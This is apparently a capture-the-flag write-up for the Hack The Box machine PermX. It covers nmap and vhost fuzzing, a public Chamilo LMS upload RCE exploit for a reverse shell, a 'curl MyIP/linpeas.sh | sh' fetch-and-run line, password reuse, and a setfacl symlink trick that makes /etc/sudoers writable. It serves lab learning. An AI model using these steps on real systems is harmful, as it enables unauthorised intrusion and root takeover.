# **scan with nmap**
Nmap 7.94SVN scan initiated Mon Aug 26 10:51:00 2024 as: nmap -sC -sV -Pn -oN PermX 10.10.11.23
Nmap scan report for 10.10.11.23
Host is up (1.6s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Mon Aug 26 10:55:06 2024 -- 1 IP address (1 host up) scanned in 245.80 seconds

I found two ports open for ssh and http and for http it show that it tried to redirect to permx.htb but was not successfull so i resolved it by adding it to the /etc/hosts file.

# Scan with Ffuf
I fuzzed for directories but all of the where not very usefull for i FUZZED for Vhosts
 `fuf  -u http://permex.htb/ -H "Host:FUZZ.permx.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -ic -ms 200

I found two www and lms so i added lms.permx.htb to the /etc/hosts as it was interesting

I did not FUZZ any further as right away i was presented with the admin panel

# Exploitation
The Title of the page was chamilo 1 so i searched for exploits related to that there were alot of them but the one i tried was the one which will execute remote code and give me a reverse shell.
it was called ==chamilo-lms-unauthenticated-big-upload-rce-poc== ,it will scan to check if the target is indeed vulnerable if it is it will respond with  ==Target is likely vulnerable. Go ahead==
 The exploit will upload all necessary files for the webshell and all i had to do was just listen for the connection back with  `nc -lvnp PORT` 


# Access Gained
After gaining access i browsed the www-data directory for files but it was kind annoying going to folder to folder so i used linpeas to identify interesting files 
`sudo python3 -m http.server #Host
curl MyIP/linpeas.sh | sh #Victim` i used this to execute the file as running it normally was giving me problems 
I found a config file which had connection to the database with passwords written on it.

I used the password found to login to ssh with the user i had identified by viewing the /etc/passwd file. After logging captured the USER flag.

# Privilege Escalation
I ran `sudo -l` to identify which commands can the user ran with sudo and it was `sudo /opt/acl.sh script`.Inside the script it ran ==setfacl== - a utility which sets sets Access Control Lists (ACLs) of files and directories.

I check out the gtfobins found something but since i could not edit the script i ,i used chatgpt to relay the contents of the script.It told me that the script can change the file permissions of any file but there were conditions and it can be misused with the use of symlinks. so i created  one for root.txt using `ln -s ./root.txt myfile`  but even after giving the file 777 permissions i could not read it so ,i thought of other files i could manipulate.I ended up giving the /etc/sudoers rw permission then edited it and added the user i was currently logged in as  to be able execute  sudo su.It worked and i read The ROOT flag.